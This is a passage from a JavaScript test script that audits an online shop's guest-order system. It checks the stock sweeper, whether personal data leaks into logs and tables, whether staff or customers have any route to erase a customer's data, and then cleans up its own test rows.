    await sql(`update orders set fulfilment_status = 'packed' where track_id = ${lit(o7.track)}`)
    const sw = await cli('cron-stock.php', '--release')
    const [r5, r6, r7] = await Promise.all(ids.map(orderRow))
    const rel6 = await one(`select stock_released from orders where id = ${r6.id}`)
    is(r5.ful === 'cancelled' && rel6 === '1' && r7.ful === 'packed', 'the sweeper cancels a cash order after 24 h, releases the stock of an unpaid card order after 2 h, and leaves a packed one alone', `cash ${r5.ful}, card stock_released ${rel6} (${r6.ful}/${r6.pay}), packed ${r7.ful}`)
    is((await jacketStock()) - sBefore === 5, 'and puts the 3 + 2 garments back on the shelf', `${sBefore} -> ${await jacketStock()}`)
    const wa = Number(await one(`select count(*) from whatsapp_outbox where order_id in (${[r5.id, r6.id].join(',')})`))
    const ct = Number(await one(`select count(*) from fulfilment_outbox where order_id = ${r5.id} and kind = 'cancel'`))
    is(wa === 0, 'the guest is told nothing about the cancellation (no customer message exists for it)', `whatsapp rows ${wa}; the only message is the warehouse's do-not-ship (${ct})`)
    note('sweeper output', JSON.stringify(sw).slice(0, 160))
  } else note('GUEST_RUN_CRON=0: the warehouse mail and the stock sweeper are not run')
})

// ============================================================================
// DB scan helper (9, 10)
// ============================================================================
async function scanDb(needles) {
  const cols = await rows(`select table_name, column_name from information_schema.columns where table_schema = database()
    and data_type in ('char','varchar','text','tinytext','mediumtext','longtext','json')`)
  const hits = {}
  const parts = []
  for (const [t, c] of cols) for (const n of needles) parts.push(`select ${lit(t + '.' + c)} as loc, ${lit(n)} as needle, count(*) as n from \`${t}\` where \`${c}\` like ${lit('%' + n + '%')}`)
  for (let i = 0; i < parts.length; i += 120) {
    const out = await rows(`select loc, needle, n from (${parts.slice(i, i + 120).join(' union all ')}) x where n > 0`)
    for (const [loc, needle, n] of out) (hits[loc] ??= []).push(`${needle}×${n}`)
  }
  return hits
}

// ============================================================================
// 9  PERSONAL DATA IN LOGS AND IN TABLES THAT SHOULD NOT HOLD IT
// ============================================================================
await section('9  personal data in logs, and where it must not be', async () => {
  const esc = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
  const classes = {
    phone: new RegExp([...PHONES].map((p) => esc(p.slice(3))).join('|')),
    name: new RegExp(`(Name[A-Z]${TAG}|Fatima ${TAG}|Edit${TAG}|Guest G\\d${TAG}|Ret${TAG}|Card${TAG}|Crm\\d${TAG}|Weak\\d${TAG}|Own${TAG}|Erase${TAG})`),
    address: new RegExp(`(GCST${TAG}|ST[A-Z]${TAG}|STK${TAG}|OLDST${TAG}|NEWST${TAG}|OWNST${TAG}|GSTR[A-Z0-9]*${TAG}|WEAKST\\d${TAG}|ERST${TAG})`),
    note: new RegExp(`(NOTE${TAG}|Note[A-Z]${TAG}|OLDNOTE${TAG}|NEWNOTE${TAG}|GNOTE[A-Z0-9]*${TAG}|ring twice ${TAG}|ERNOTE${TAG})`),
    email: EMAILS.size ? new RegExp([...EMAILS].map(esc).join('|')) : /(?!)/,
    track: new RegExp([...TRACKS].map(esc).join('|')),
  }
  const files = readdirSync(LOGDIR).map((f) => join(LOGDIR, f))
  const extra = (process.env.GUEST_EXTRA_LOGS ?? join(HOME, 'logs/mariadb-error.log')).split(',').filter((f) => f && existsSync(f))
  const report = {}, adminHits = []
  for (const f of [...files, ...extra]) {
    const lines = readFileSync(f, 'utf8').split('\n').filter((l) => !/customer\.php\?r=orders&/.test(l)) // 6 sent a phone in a probe query on purpose
    const adminSearch = lines.filter((l) => /admin\.php\?r=(orders&search|crm_list&q|profiles_list&q|crm_detail&key)=/.test(l) && classes.phone.test(l))
    adminHits.push(...adminSearch)
    const c = Object.fromEntries(Object.entries(classes).map(([k, re]) => [k, lines.filter((l) => re.test(l)).length]))
    c.phone -= adminSearch.length
    report[f.split('/').pop()] = c
    note(`log ${f.split('/').pop()}`, `${lines.length} lines; phone ${c.phone}, name ${c.name}, address ${c.address}, note ${c.note}, email ${c.email}, track id ${c.track}`)
  }
  const sum = (k) => Object.values(report).reduce((a, c) => a + c[k], 0)
  is(sum('phone') === 0 && sum('name') === 0 && sum('address') === 0 && sum('note') === 0 && sum('email') === 0,
    'no phone number, name, address, note or email address is written to the web server, PHP, KNET or MariaDB logs', `phone ${sum('phone')}, name ${sum('name')}, address ${sum('address')}, note ${sum('note')}, email ${sum('email')}`)
  defect('G15', adminHits.length === 0, 'staff searches for a customer by phone number without putting the number in the URL',
    `${adminHits.length} access-log lines carry a phone number as a query string, e.g. ${adminHits[0]?.replace(/^.*(GET|POST) /, '$1 ').slice(0, 70)}: admin.php?r=orders&search=<phone>, crm_list&q=, profiles_list&q= and crm_detail&key=phone:965… are all GETs`)
  defect('G11', sum('track') === 0, 'the order number (the credential for status and invoice) stays out of the logs',
    `${sum('track')} log lines carry a track id in a URL (GET ?r=status&id=, ?r=invoice&id=, /pay.php?trackid=): anyone who can read the access log can open the invoice (name + address) of every order looked up`)
  const knetLog = existsSync(join(LOGDIR, 'knet-payments.log')) ? readFileSync(join(LOGDIR, 'knet-payments.log'), 'utf8') : ''
  note('KNET payment log (above the web root; it records the client address and the track id of every start)', knetLog ? `${knetLog.split('\n').filter(Boolean).length} lines; fields: ${[...new Set(knetLog.match(/"[a-z_]+":/g) ?? [])].slice(0, 14).join(' ')}` : 'empty')
  // tables that must not hold personal data
  const hits = await scanDb([[...PHONES][0].slice(3), `Name${'V'}${TAG}`, `ST${'V'}${TAG}`, `Note${'V'}${TAG}`])
  const allowed = new Set(['orders.customer_name', 'orders.customer_phone', 'orders.customer_street', 'orders.customer_note', 'fulfilment_outbox.payload'])
  const surprising = Object.keys(hits).filter((k) => !allowed.has(k) && !/^(support_|return_|crm_|customer_accounts|blocked_customers|whatsapp_outbox)/.test(k))
  is(surprising.length === 0, 'the guest\'s name, address, note and phone appear only in the order, the warehouse outbox, and the tables built to hold them', surprising.join() || Object.keys(hits).join(', '))
  const rl = await rows(`select count(*) from rate_limit where bucket_key regexp '[^0-9a-f]'`)
  is(rl[0][0] === '0', 'rate-limit rows are opaque hashes (no address or phone is stored in the clear)')
  const cookies = []
  for (const r of [await get(B.base, `status&id=${fx.V.track}`, { headers: { 'X-Forwarded-For': newIp() } }), await get(B.base, `invoice&id=${fx.V.track}`, { headers: { 'X-Forwarded-For': newIp() } }),
    await get(B.base, 'checkout_config', { headers: { 'X-Forwarded-For': newIp() } }), await placeOrder(B, { ip: newIp() }), await post(B.base, 'return_lookup', { track_id: fx.V.track, phone: fx.V.phone }, { headers: { ...CUST, 'X-Forwarded-For': newIp() } })]) {
    if (r.headers['set-cookie']) cookies.push(r.headers['set-cookie'])
  }
  is(cookies.length === 0, 'a guest\'s requests (order, status, invoice, returns) set no cookie at all', cookies.join() || 'none')
  note('the Privacy page says the site sets no cookies; customer accounts (register/login) do set a session cookie, so that sentence is true for guests only')
})

// ============================================================================
// 10  REMOVING A GUEST'S DATA
// ============================================================================
await section('10  data removal: is there a way to erase or anonymise a guest, and what is left', async () => {
  const P10 = newPhone(), E10 = newEmail()
  const names = { name: `Erase${TAG}`, street: `ERST${TAG}`, note: `ERNOTE${TAG}` }
  const o = await placeOrder(B, { ip: newIp(), customer: baseCustomer({ phone: P10, ...names }) })
  const r10 = await orderRow(o.track)
  await adm('fulfilment', { method: 'POST', body: { order_id: Number(r10.id), status: 'delivered' } })
  const lk = await post(B.base, 'return_lookup', { track_id: o.track, phone: P10 }, { headers: { ...CUST, 'X-Forwarded-For': newIp() } })
  const rq = await post(B.base, 'return_submit', { track_id: o.track, phone: P10, note: `ERRET${TAG}`, items: [{ order_item_id: lk.json.order.items[0].id, qty: 1, action: 'return', reason: 'other' }] }, { headers: { ...CUST, 'X-Forwarded-For': newIp() } })
  const tk = await post(B.base, 'support_create', { name: names.name, email: E10, phone: P10, subject: 'ERSUBJ', message: `hello from ${names.name}`, order_track_id: o.track }, { headers: { ...CUST, 'X-Forwarded-For': newIp() } })
  await adm('crm_note', { method: 'POST', body: { key: `phone:965${P10}`, note: `ERCRM ${names.name} asked about delivery` } })
  await sql(`insert into blocked_customers (phone, scope) values ('965${P10}', 'cod') on duplicate key update scope='cod'`)
  if (RUN_CRON) await drainFulfilment()
  is(rq.status === 201 && tk.status === 201, 'a return case, a support ticket, a CRM note and a block entry now exist for this guest', `${rq.status}/${tk.status}`)
  const needles = [P10, names.name, names.street, names.note, E10]
  const before = await scanDb(needles)
  console.log('     where the guest\'s data lives now:'); for (const [k, v] of Object.entries(before).sort()) console.log(`       ${k.padEnd(34)} ${v.join(' ')}`)

  // is there a route? (admin signed in, so only a missing route answers 404)
  const wanted = ['order_delete', 'delete_order', 'orders_delete', 'customer_delete', 'delete_customer', 'erase_customer', 'customer_erase', 'anonymise', 'anonymize', 'anonymise_order', 'purge', 'gdpr_export', 'gdpr_delete', 'data_export', 'export_customer', 'forget_customer']
  const found = []
  for (const w of wanted) { const r = await adm(w, { method: 'POST', body: {} }); if (r.status !== 404) found.push(`${w}:${r.status}`) }
  defect('G2', found.length > 0, 'a staff route exists to erase or anonymise a customer', `none of ${wanted.length} plausible admin routes exists (all 404)${found.length ? ' except ' + found.join() : ''}`)
  const pubFound = []
  for (const w of ['erase', 'delete_my_data', 'forget_me', 'data_request']) { const r = await post(B.base, w, { track_id: o.track, phone: P10 }, { headers: { ...CUST, 'X-Forwarded-For': newIp() } }); if (r.status !== 404) pubFound.push(w) }
  is(pubFound.length === 0, 'and no public route lets a customer ask (the Privacy page says to message WhatsApp or email)')
  // grep the repo for any script that deletes or anonymises personal data
  const scan = []
  const walk = (dir) => { for (const f of readdirSync(dir, { withFileTypes: true })) { const p = join(dir, f.name); if (f.isDirectory()) { if (!['node_modules', 'dist', '.git'].includes(f.name)) walk(p) } else if (/\.(php|mjs|sh|sql)$/.test(f.name) && !/guest-orders-test/.test(f.name)) scan.push(p) } }
  walk(join(ROOT, 'dropin')); walk(join(ROOT, 'scripts'))
  const re = /anonymi[sz]e|\berase\b|gdpr|right to be forgotten|delete from (orders|fulfilment_outbox|whatsapp_outbox|return_requests|support_tickets|crm_contacts|crm_notes|blocked_customers|customer_accounts)\b|update orders set customer_(name|phone)\s*=\s*null/gi
  const found2 = new Set()
  for (const p of scan.filter((x) => !/-test\.mjs$|scan\.mjs$/.test(x))) for (const m of readFileSync(p, 'utf8').matchAll(re)) found2.add(`${m[0].toLowerCase()} (${p.replace(ROOT, '')})`)
  is([...found2].every((m) => m.startsWith('delete from blocked_customers')), 'the only personal-data deletion anywhere in dropin/ or scripts/ is removing a phone from the block list', [...found2].join('; ') || 'none found')
  const pruners = scan.filter((p) => /cron-.*\.php$/.test(p) && /delete from/i.test(readFileSync(p, 'utf8'))).map((p) => p.replace(ROOT, ''))
  note('cron scripts that delete anything', pruners.join(', ') || 'none')

  // the best a person can do today: overwrite the order through the edit route
  const wipe = await adm('customer', { method: 'POST', body: { order_id: Number(r10.id), fields: {
    customer_name: 'Deleted', customer_phone: '', customer_street: '-', customer_note: '', customer_area: 'Deleted', customer_block: '-', customer_building: '-', customer_floor: '', customer_flat: '' } } })
  const afterRow = await orderRow(o.track)
  note('the edit route used as an eraser', `HTTP ${wipe.status} ${wipe.json?.error ?? 'ok'}; stored name ${JSON.stringify(afterRow?.name)}, phone ${JSON.stringify(afterRow?.phone)}, street ${JSON.stringify(afterRow?.street)}`)
  const after = await scanDb(needles)
  console.log('     what is still there after the order row is overwritten:'); for (const [k, v] of Object.entries(after).sort()) console.log(`       ${k.padEnd(34)} ${v.join(' ')}`)
  const left = Object.keys(after)
  defect('G2b', left.length === 0, 'after the best available erasure no copy of the guest\'s data remains', `${left.length} places still hold it: ${left.join(', ')}; plus the warehouse mail already sent`)
  is(!after['orders.customer_phone'] && !after['orders.customer_name'], 'the order row itself can be overwritten (name, phone, address, note)', `phone ${JSON.stringify(afterRow?.phone)}`)
  // customer account side: no delete either
  const cdel = await request(B.base, 'POST', '/customer.php?r=delete_account', { headers: { ...CUST, 'X-Forwarded-For': newIp() }, body: {} })
  is(cdel.status === 404, 'an account holder has no delete-my-account route either', `HTTP ${cdel.status}`)
  fx.erase = { P10, names }
})

// ============================================================================
// CLEAN UP
// ============================================================================
await section('CLEANUP  remove what this run created', async () => {
  const t = [...TRACKS], p = [...PHONES], e = [...EMAILS]
  const ids = (await rows(`select id from orders where track_id in (${inList(t)})`)).map((r) => r[0])
  const idl = ids.length ? ids.join(',') : '0'
  const stmts = [
    `delete from return_request_events where request_id in (select id from return_requests where order_id in (${idl}))`,
    `delete from return_request_items where request_id in (select id from return_requests where order_id in (${idl}))`,
    `delete from return_requests where order_id in (${idl})`,
    `delete from reviews where order_id in (${idl})`,
    `delete from whatsapp_outbox where order_id in (${idl})`,
    `delete from fulfilment_outbox where order_id in (${idl})`,
    `delete from order_tracking_events where order_id in (${idl})`,
    `delete from order_items where order_id in (${idl})`,
    `delete from orders where id in (${idl})`,
    `delete from crm_notes where contact_key in (${inList(p.map((x) => 'phone:' + x))})`,
    `delete from crm_contacts where contact_key in (${inList(p.map((x) => 'phone:' + x))})`,
    `delete from blocked_customers where phone in (${inList(p)})`,
    `delete from support_messages where ticket_id in (select id from support_tickets where customer_email in (${inList(e)}))`,
    `delete from support_tickets where customer_email in (${inList(e)})`,
    `delete from customer_password_resets where customer_id in (select id from customer_accounts where email in (${inList(e)}))`,
    `delete from customer_accounts where email in (${inList(e)})`,
    `delete from admin_activity_log where actor_email = ${lit(ADMIN_EMAIL)}`,
    `delete from admin_users where email = ${lit(ADMIN_EMAIL)}`,
  ]
  for (const s of stmts) { try { await sql(s) } catch (err) { note('cleanup step skipped', `${s.slice(0, 50)}… ${String(err.message).split('\n')[0].slice(0, 80)}`) } }
  if (stockRestore !== null) await sql(`update product_variants set stock = ${stockRestore} where slug=${lit(JACKET)} and size='L'`)
  if (stockRestoreM !== null) await sql(`update product_variants set stock = ${stockRestoreM} where slug=${lit(JACKET)} and size='M'`)
  ok('the rows and stock this run touched are put back', `${ids.length} orders, ${p.length} phones, ${e.length} emails`)
})

stopAll()
if (process.env.GUEST_KEEP === '1') console.log(`\n(GUEST_KEEP=1: scratch kept in ${TMP})`)
else { try { rmSync(TMP, { recursive: true, force: true }) } catch { /* scratch */ } }
console.log(`\n${passes} ok, ${fails} FAIL, ${defects} open DEFECT${defects === 1 ? '' : 's'}${defects ? ` (${[...new Set(defectList)].join(', ')})` : ''}`)
process.exit(fails > 0 || (STRICT && defects > 0) ? 1 : 0)
